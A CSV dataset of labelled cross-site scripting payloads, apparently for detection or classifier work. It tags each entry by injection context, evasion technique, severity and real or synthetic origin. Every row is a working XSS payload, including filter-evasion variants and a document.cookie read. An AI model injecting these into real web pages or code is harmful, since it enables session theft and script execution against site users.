payload,context,technique,severity,length,source
"<abbr onmousedown=""alert(1)"">AnonKryptiQuz</abbr>",event_handler,none,medium,49,real
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>",event_handler,none,medium,103,real
"<title><img title=""</title><img src onerror=alert(1)>""></title>",event_handler,none,medium,63,real
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>,tag_injection,html_entity,low,56,real
"<svG oNtoGglE=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,53,synthetic
<abbr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<frameset onmouseout=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,56,real
<IMG SRC=JaVaScRiPt:alert('AnonKryptiQuz')>,js_uri,case_variation,medium,43,real
<svg onbegin=prompt(document.domain)>,tag_injection,synthetic,medium,37,synthetic
"<datalist onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",event_handler,none,medium,77,real
<progress onpointerup=alert(1) style=display:block>AnonKryptiQuz</progress>,event_handler,none,medium,75,real
"<cite ondblclick=""alert(1)"">AnonKryptiQuz</cite>",event_handler,none,medium,48,real
"<canvas onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,71,real
"<xmp onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</xmp>",event_handler,none,medium,82,real
<svg onmouseenter=prompt(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=print()></tbody>",event_handler,none,low,112,real
%27 onclick=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,38,synthetic
"<img src="""" onerror=""alert(document.cookie)"">",event_handler,none,high,45,real
"<q onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</q>",event_handler,none,medium,77,real
' onmous&#101;ov&#101;r=consol&#101;.log('XSS') ',attribute_escape,synthetic,medium,49,synthetic
"<html onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,64,real
"<tbody onmouseover=""alert(1)"">AnonKryptiQuz</tbody>",event_handler,none,medium,51,real
"d=""alert('AnonKryptiQuz');\"")"";",generic,none,medium,31,real
</script></script><<<<script><>>>><<<script>alert(123)</script>,script_injection,none,medium,63,real
"<meter draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</meter>",event_handler,none,medium,63,real
"<acronym onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,76,real
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rp>",event_handler,none,medium,97,real
"<footer onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,73,real
<script>eval(‘a\u006cert(1)’);</script>,script_injection,unicode_escape|encoding,high,39,real
"<ins onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,68,real
"<dl onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",event_handler,none,medium,62,real
